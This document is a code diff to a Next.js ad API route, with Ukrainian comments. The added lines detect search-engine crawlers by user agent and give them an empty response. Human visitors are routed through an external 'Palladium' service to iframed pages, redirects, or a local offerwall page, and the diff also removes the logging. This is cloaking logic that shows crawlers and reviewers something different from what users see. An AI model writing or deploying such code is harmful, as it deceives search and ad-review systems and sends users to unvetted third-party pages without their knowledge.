@@ -1,4 +1,4 @@
-// /app/api/ads/route.ts (обробка mode:3 навіть при result: 0)
+// /app/api/ads/route.ts (оновлений для Googlebot/юзер логіки)
 import { NextRequest } from 'next/server';
 import { join } from 'path';
 import { promises as fs } from 'fs';
@@ -28,13 +28,20 @@ function flattenPayload(obj: PayloadMap, prefix = ''): Record<string, string> {
 }
 
 export async function GET(req: NextRequest) {
+    const ua = req.headers.get('user-agent')?.toLowerCase() || '';
+    const isBot = /googlebot|bingbot|yandex|duckduckbot|baiduspider/.test(ua);
+
+    if (isBot) {
+        // Повертаємо стандартну Next.js головну для ботів (SSR)
+        return new Response(null, { status: 204 });
+    }
+
     const searchParams = req.nextUrl.searchParams;
     if (searchParams.get('dr_jsess') === '1') {
         return new Response(null, { status: 200 });
     }
 
     const ip = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for') || '8.8.8.8';
-    const ua = req.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
     const host = req.headers.get('host') || '';
 
     const rawPayload: PayloadMap = {
@@ -65,21 +72,16 @@ export async function GET(req: NextRequest) {
             body: new URLSearchParams(payload),
         });
 
-        console.log('🔁 Palladium status:', palladiumRes.status);
         const text = await palladiumRes.text();
-        console.log('📄 Raw Palladium response:', text);
-
         let result: PalladiumResponse = { result: false };
 
         try {
             result = JSON.parse(text);
-            console.log('📩 Palladium response (parsed):', result);
         } catch {
-            console.error('❌ JSON parse error. Raw response:', text);
             return new Response(null, { status: 204 });
         }
 
-        // Обробляємо mode 3 навіть якщо result === false
+        // Обробляємо mode: 3 навіть якщо result === false
         if (result.mode === 3 && result.target) {
             try {
                 const filePath = join(process.cwd(), 'public', 'newgermany_oferwall', result.target);
@@ -88,24 +90,18 @@ export async function GET(req: NextRequest) {
                     status: 200,
                     headers: { 'Content-Type': 'text/html' },
                 });
-            } catch (err) {
-                console.error('❌ Error loading local file:', err);
+            } catch {
                 return new Response('File not found', { status: 404 });
             }
         }
 
         if (result.result) {
-            const mode = result.mode;
-            const target = result.target;
-            const content = result.content;
+            const { mode, target, content } = result;
 
             if (mode === 1 && target) {
                 return new Response(
                     `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`,
-                    {
-                        status: 200,
-                        headers: { 'Content-Type': 'text/html' },
-                    }
+                    { status: 200, headers: { 'Content-Type': 'text/html' } }
                 );
             } else if (mode === 2 && target) {
                 return Response.redirect(target);
@@ -117,9 +113,19 @@ export async function GET(req: NextRequest) {
             }
         }
 
-        return new Response(null, { status: 204 });
-    } catch (error) {
-        console.error('Palladium API error', error);
+        // Якщо нічого не підходить — редірект на index.html юзеру
+        const fallbackPath = join(process.cwd(), 'public', 'newgermany_oferwall', 'index.html');
+        try {
+            const fallbackHtml = await fs.readFile(fallbackPath, 'utf8');
+            return new Response(fallbackHtml, {
+                status: 200,
+                headers: { 'Content-Type': 'text/html' },
+            });
+        } catch {
+            return new Response('Fallback file not found', { status: 404 });
+        }
+
+    } catch {
         return new Response('Internal Server Error', { status: 500 });
     }
 }
